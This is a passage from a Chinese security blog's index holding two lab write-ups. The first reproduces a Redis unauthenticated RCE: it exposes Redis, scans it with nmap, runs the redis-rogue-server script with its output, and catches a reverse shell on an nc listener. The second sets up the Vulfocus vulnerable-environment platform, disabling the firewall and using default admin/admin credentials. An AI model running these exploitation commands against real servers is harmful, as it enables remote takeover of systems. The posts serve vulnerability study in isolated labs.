<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搭建</span><br><span class="line">docker pull damonevking/redis5.0 </span><br><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server</span><br></pre></td></tr></table></figure>

<h3 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos 7</span><br><span class="line">下载地址：http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建</span></span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br><span class="line">tar -zvxf redis-4.0.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.11</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改redis.conf。开启外部访问，关闭保护模式</span></span><br><span class="line">vi redis.conf</span><br><span class="line"><span class="comment"># 修改bind 127.0.0.1为bind 0.0.0.0</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"><span class="comment"># 修改protected-mode yes为protected-mode no</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154018109.png" alt="image-20210829154018109"></p>
<h3 id="windows搭建"><a href="#windows搭建" class="headerlink" title="windows搭建"></a>windows搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：windwos 7</span><br><span class="line">windows下载地址：</span><br><span class="line">https://github.com/microsoftarchive/redis/releases</span><br></pre></td></tr></table></figure>

<p>下载Redis-x64-3.2.100.zip，并解压到本地目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改配置文件redis.windows.conf ，开启远程访问，关闭保护模式。</span><br><span class="line">修改bind 127.0.0.1为bind 0.0.0.0</span><br><span class="line">修改protected-mode yes为protected-mode no</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154046374.png" alt="image-20210829154046374"></p>
<p>启动redis服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server.exe  redis.windows.conf </span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>扫描漏洞端口</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap 192.168.40.131 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-12 21:34 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.40.131</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line">MAC Address: 00:0C:29:10:79:D9 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.22 seconds</span><br></pre></td></tr></table></figure>

<p><strong>利用攻击脚本：</strong><a href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:/opt/tools/Redis/redis-rogue-server-master# python3 redis-rogue-server.py  --rhost 192.168.40.131 --lhost 192.168.40.132 --exp=exp.so</span><br><span class="line">______         _ _      ______                         _____                          </span><br><span class="line">| ___ \       | (_)     | ___ \                       /  ___|                         </span><br><span class="line">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ </span><br><span class="line">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#x27;__\ \ / / _ \ &#x27;__|</span><br><span class="line">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   </span><br><span class="line">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   </span><br><span class="line">                                     __/ |                                            </span><br><span class="line">                                    |___/                                             </span><br><span class="line">@copyright n0b0dy @ r3kapig</span><br><span class="line"></span><br><span class="line">[info] TARGET 192.168.40.131:6379</span><br><span class="line">[info] SERVER 192.168.40.132:21000</span><br><span class="line">[info] Setting master...</span><br><span class="line">[info] Setting dbfilename...</span><br><span class="line">[info] Loading module...</span><br><span class="line">[info] Temerory cleaning up...</span><br><span class="line">What do u want, [i]nteractive shell or [r]everse shell: r #输入i是直接获取交互式shell</span><br><span class="line">[info] Open reverse shell...</span><br><span class="line">Reverse server address: 192.168.40.132</span><br><span class="line">Reverse server port: 2333      </span><br><span class="line">[info] Reverse shell payload sent.</span><br><span class="line">[info] Check at 192.168.40.132:2333</span><br><span class="line">[info] Unload module...</span><br><span class="line"></span><br><span class="line">root@kali:~# nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154322123.png" alt="image-20210829154322123"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154332910.png" alt="image-20210829154332910"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>Vulfocus 漏洞环境搭建</title>
    <url>/2021/08/29/Vulfocus%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote>
<p>Vulfocus是一个漏洞集成平台，所以可以无限添加漏洞环境并且没有限制。因为漏洞环境是docker镜像，所以每次重启动漏洞环境之前的环境都会还原，不会出现因对环境造成的破坏而下一次启动环境失败的问题。</p>
</blockquote>
<span id="more"></span>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>获取docker镜像，执行命令;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121137130.png" alt="image-20210829121137130"></p>
<p>查看docker镜像;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121216838.png" alt="image-20210829121216838"></p>
<p>启动docker镜像;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=XXX.XXX.XXX.XXX vulfocus/vulfocus #IP必须是本机地址</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121314447.png" alt="image-20210829121314447"></p>
<p>之后，关闭防火墙；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl disable firewalld</span><br><span class="line">登陆用户名密码：admin/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121518860.png" alt="image-20210829121518860"></p>
<p>通过以下步骤进行靶机场景搭建;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121549668.png" alt="image-20210829121549668"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
</search>
